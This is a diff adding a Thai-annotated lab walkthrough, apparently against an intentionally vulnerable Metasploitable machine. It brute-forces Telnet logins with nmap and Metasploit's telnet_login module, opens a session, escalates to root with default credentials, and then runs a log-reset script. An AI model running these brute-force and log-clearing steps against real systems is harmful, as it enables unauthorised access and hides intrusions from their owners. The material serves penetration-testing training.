@@ -36,3 +36,49 @@ exploit
 whoami
 pwd
 ls -la
+
+### Target 2: Port 23 (Telnet - Brute Force Attack)
+ช่องโหว่นี้เกิดจากการตั้งรหัสผ่านที่คาดเดาง่าย (Weak Password) ประกอบกับ Telnet ส่งข้อมูลแบบ Plain-text 
+```bash
+# 1. Scanning
+nmap -p 23 -sV [Target_IP]
+
+# 2. Brute Force Attack (via Metasploit)
+msfconsole
+use auxiliary/scanner/telnet/telnet_login
+
+# สามารถเลือกใช้ Dictionary Attack หรือระบุ Username/Password ตรงๆ
+set USERNAME msfadmin
+set PASSWORD msfadmin
+# หรือใช้ไฟล์: set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
+
+set RHOSTS [Target_IP]
+set THREADS 10
+set VERBOSE false
+run
+
+# 3. Session Connection
+sessions
+sessions -i [Session_ID]
+
+# 4. Privilege Escalation (ไต่ระดับสิทธิ์เป็น Root)
+whoami
+sudo su
+# (Enter password: msfadmin)
+whoami
+cd /root
+ls -la
+
+###
+Post-Mission & Reset
+# On Target Machine
+cd /root
+cat reset_logs.sh
+./reset_logs.sh
+reboot
+exit
+
+# On Attacker Machine
+clear
+
+
